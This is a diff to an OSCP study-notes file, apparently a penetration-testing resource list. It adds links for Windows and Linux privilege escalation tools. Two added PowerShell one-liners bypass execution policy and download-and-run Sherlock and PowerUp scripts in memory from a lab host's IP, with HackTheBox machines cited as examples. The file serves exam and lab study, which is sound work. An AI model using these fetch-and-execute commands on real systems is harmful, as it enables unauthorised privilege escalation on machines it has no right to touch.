@@ -3,6 +3,10 @@
 PWK Syllabus
 https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf
 
+### OSCP like VulnHub Game 
+https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms.html
+
+
 ### Linux and Bash
 
 1. Linux Journey - https://linuxjourney.com/
@@ -32,14 +36,35 @@ https://github.com/fkclai/bufferoverflow
 
 ### File Transfer
 
-### Privilege Escalation
-OSCP like VulnHub Game 
-https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms.html
+### Windows Privilege Escalation
 
-Window Privilege Escalation via Automated Script
+- Information Generating
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+
+- Window Privilege Escalation via Automated Script
 https://www.hackingarticles.in/window-privilege-escalation-via-automated-script/
 
-Linux
+- Windows Exploit-Suggester
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+e.g. HTB Json
+
+- Missing software patches - Sherlock
+https://github.com/rasta-mouse/Sherlock
+e.g. HTB Json
+```
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.18:8888/Sherlock.ps1'); Find-AllVulns -Command 'start powershell.exe'" 
+```
+
+- PowerSploit
+https://github.com/PowerShellMafia/PowerSploit
+
+```
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.18:8888/PowerSploit/Privesc/PowerUp.ps1'); Invoke-AllChecks -Command 'start powershell.exe'" 
+```
+- Other Tools 
+https://www.secureauth.com/labs/open-source-tools/impacket
+
+### Linux Privilege Escalation
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 
 ### Client Side Attacks
